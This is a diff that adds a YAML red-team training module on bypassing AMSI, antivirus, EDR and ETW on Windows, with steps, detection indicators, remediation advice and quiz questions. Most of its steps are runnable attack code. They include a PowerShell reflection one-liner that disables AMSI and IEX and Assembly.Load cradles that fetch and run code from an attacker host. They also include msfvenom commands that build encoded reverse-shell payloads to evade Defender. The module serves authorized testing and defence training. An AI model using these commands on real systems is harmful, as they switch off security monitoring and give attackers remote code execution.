@@ -1,0 +1,208 @@
+# Category: Offensive Security - Defense Evasion
+name: "AMSI Bypass and AV Evasion Techniques"
+id: "evasion-amsi-av-001"
+category: "offense_defense_evasion"
+subcategory: "av_edr_evasion"
+difficulty: "advanced"
+estimated_time: "90"
+
+tags:
+  - defense-evasion
+  - amsi
+  - antivirus-bypass
+  - edr-evasion
+  - powershell
+  - obfuscation
+  - reflective-loading
+  - process-injection
+  - windows-defender
+  - red-team
+  - mitre-t1562
+  - mitre-t1059
+  - mitre-t1027
+  - offensivesecurity
+  - pentest
+
+description: |
+  Test and validate defensive control coverage by applying common AMSI bypass
+  and antivirus evasion techniques used in authorized red team engagements.
+  Covers PowerShell AMSI patching, obfuscation, and in-memory execution.
+
+learning_objectives:
+  - Understand how AMSI hooks PowerShell and .NET assemblies
+  - Apply AMSI bypass techniques in authorized red team contexts
+  - Obfuscate payloads to reduce AV signature detection
+  - Test EDR behavioral detection using common evasion patterns
+
+tools:
+  - "powershell"
+  - "invoke-obfuscation"
+  - "amsi-fail"
+  - "chameleon"
+  - "dotnet"
+  - "msfvenom"
+
+prerequisites:
+  - "Authorized red team engagement or lab environment"
+  - "Windows target with PowerShell 5.1+"
+  - "Understanding of .NET CLR and AMSI architecture"
+  - "Written authorization from system owner"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify AV and EDR products on target system"
+    commands:
+      - "# Check Windows Defender status"
+      - "Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled"
+      - "# Check for EDR products"
+      - "Get-Process | Where-Object {$_.Name -match 'falcon|cb|cylance|sentinel|cortex|tanium|defender'}"
+      - "sc query type= all | findstr -i 'falcon\\|crowdstrike\\|carbonblack\\|cylance\\|sentinelone'"
+      - "# Check loaded drivers (EDR kernel drivers)"
+      - "fltMC.exe"
+      - "# Check AMSI providers"
+      - "reg query 'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers'"
+    expected_output: "Installed AV/EDR product names, versions, and protection status"
+    detection: "Process enumeration and registry queries logged by EDR"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "PowerShell AMSI bypass via memory patching"
+    commands:
+      - "# Method 1: AmsiUtils field reflection (requires PowerShell)"
+      - "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)"
+      - "# Method 2: String concatenation to evade static detection"
+      - "$w = 'Am'+'si'+'Utils'; $a = [Ref].Assembly.GetType('System.Management.Automation.'+$w)"
+      - "# Method 3: Force AmsiScanBuffer to return AMSI_RESULT_CLEAN"
+      - "# (Technique patching amsi.dll in memory — documented for detection validation)"
+      - "# Validate bypass worked"
+      - "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+    expected_output: "AMSI disabled for current PowerShell session — subsequent scripts not scanned"
+    detection: "EDR: PowerShell reflection to AmsiUtils; Event ID 4104 with AMSI bypass strings"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Obfuscate PowerShell scripts using Invoke-Obfuscation"
+    commands:
+      - "# Install and use Invoke-Obfuscation"
+      - "git clone https://github.com/danielbohannon/Invoke-Obfuscation /opt/Invoke-Obfuscation"
+      - "Import-Module /opt/Invoke-Obfuscation/Invoke-Obfuscation.psd1"
+      - "# Obfuscate a script"
+      - "Invoke-Obfuscation -ScriptPath /tmp/payload.ps1 -Command 'TOKEN\\ALL\\1' -Quiet"
+      - "# String-based obfuscation"
+      - "Invoke-Obfuscation -ScriptPath /tmp/payload.ps1 -Command 'STRING\\1' -Quiet"
+      - "# Encoding-based obfuscation"
+      - "Invoke-Obfuscation -ScriptPath /tmp/payload.ps1 -Command 'ENCODING\\5' -Quiet"
+      - "# Chameleon — PowerShell obfuscator"
+      - "python3 /opt/Chameleon/chameleon.py /tmp/payload.ps1 -o /tmp/obfuscated.ps1 -s"
+    expected_output: "Obfuscated PowerShell script with reduced AV signature detection rate"
+    detection: "EDR behavioral: obfuscated script execution; high entropy string in PS command line"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "In-memory assembly loading to avoid disk-based AV"
+    commands:
+      - "# Load .NET assembly from URL into memory (no disk write)"
+      - "$data = (New-Object System.Net.WebClient).DownloadData('http://[attacker_ip]/tool.exe')"
+      - "$assembly = [System.Reflection.Assembly]::Load($data)"
+      - "$entry = $assembly.EntryPoint"
+      - "$entry.Invoke($null, @(,[string[]]@()))"
+      - "# Load from base64 encoded string"
+      - "$bytes = [Convert]::FromBase64String('[base64_encoded_assembly]')"
+      - "[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)"
+      - "# Execute without touching disk using PowerShell IEX"
+      - "IEX (New-Object Net.WebClient).DownloadString('http://[attacker_ip]/script.ps1')"
+    expected_output: "Tool executed entirely in memory without writing to disk"
+    detection: "EDR: reflective .NET loading; network connection followed by assembly load event"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "ETW (Event Tracing for Windows) bypass"
+    commands:
+      - "# Patch EtwEventWrite to prevent telemetry (in-memory patch)"
+      - "# This prevents .NET ETW events from being sent to EDR"
+      - "$provider = [System.Diagnostics.Eventing.EventProvider]"
+      - "# Null out ETW provider — documented red team technique"
+      - "[System.Reflection.Assembly]::LoadWithPartialName('System.Core')"
+      - "# Alternative: use hardware breakpoints to intercept ETW calls"
+      - "# Validate ETW disabled"
+      - "logman query providers | findstr 'PowerShell'"
+    expected_output: "ETW telemetry suppressed for current process — reduced EDR visibility"
+    detection: "EDR: EtwEventWrite API hook removal; process with ETW patches flagged"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Test payload against Windows Defender signature detection"
+    commands:
+      - "# Generate test payload"
+      - "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f exe -o /tmp/test.exe"
+      - "# Check VirusTotal detection rate (submit hash only — no upload)"
+      - "sha256sum /tmp/test.exe"
+      - "curl -s 'https://www.virustotal.com/api/v3/files/[sha256]' -H 'x-apikey: [vt_api_key]' | python3 -m json.tool | grep -E 'malicious|suspicious|undetected'"
+      - "# Test with custom shellcode encoder"
+      - "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -e x64/xor_dynamic -i 5 -f raw -o /tmp/shellcode.bin"
+      - "# Validate Defender exclusions in test lab"
+      - "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension"
+    expected_output: "Payload detection rate and effectiveness of encoding against AV signatures"
+    detection: "Windows Defender: signature match alert; EDR: shellcode execution behavior"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1562.001"
+    description: "Impair Defenses: Disable or Modify Tools"
+  - standard: "MITRE ATT&CK"
+    control: "T1027"
+    description: "Obfuscated Files or Information"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-3"
+    description: "Malicious code protection — validate AV coverage"
+  - standard: "CIS Controls v8"
+    control: "10.1"
+    description: "Deploy and maintain anti-malware software"
+
+detection:
+  network_indicators:
+    - "PowerShell downloading and executing content from external IP"
+    - "Outbound connection from PowerShell process to attacker infrastructure"
+  log_indicators:
+    - "Event ID 4104: PowerShell script block logging — AMSI bypass strings detected"
+    - "EDR alert: reflective DLL/assembly loading"
+    - "Windows Defender: AmsiScanBuffer patch detected"
+    - "Event ID 7045: New service created by injected payload"
+  endpoint_indicators:
+    - "PowerShell process with high memory allocation"
+    - "Unsigned .NET assembly loaded into PowerShell process"
+    - "ETW provider unregistered from PowerShell process"
+
+remediation:
+  immediate:
+    - "Enable PowerShell Script Block Logging and Module Logging via GPO"
+    - "Enable Constrained Language Mode for PowerShell"
+    - "Keep Windows Defender definitions current and real-time protection enabled"
+  long_term:
+    - "Deploy EDR with memory scanning and behavioral detection (not just signatures)"
+    - "Enable AMSI integration in all script engines (PowerShell, VBScript, JScript)"
+    - "Implement Application Control (WDAC) to block unsigned script execution"
+    - "Enable Protected Process Light (PPL) for AV/EDR processes"
+
+variables:
+  attacker_ip: "10.10.10.1"
+  base64_encoded_assembly: "BASE64_ASSEMBLY_HERE"
+  vt_api_key: "YOUR_VT_API_KEY"
+
+assessment_questions:
+  - "What is AMSI and which Microsoft products integrate with it?"
+  - "Why does in-memory assembly loading evade traditional AV scanning?"
+  - "How does ETW bypass reduce EDR visibility into .NET execution?"
+  - "What PowerShell GPO settings significantly raise the bar for AMSI bypass?"
+  - "Why is behavioral EDR detection more effective than signature-based AV for these techniques?"
+
+references:
+  - url: "https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"
+    title: "Microsoft AMSI Documentation"
+  - url: "https://github.com/danielbohannon/Invoke-Obfuscation"
+    title: "Invoke-Obfuscation"
+  - url: "https://attack.mitre.org/techniques/T1562/001/"
+    title: "MITRE ATT&CK T1562.001"
+  - url: "https://github.com/RythmStick/AMSIFail"
+    title: "AMSIFail Bypass Collection"
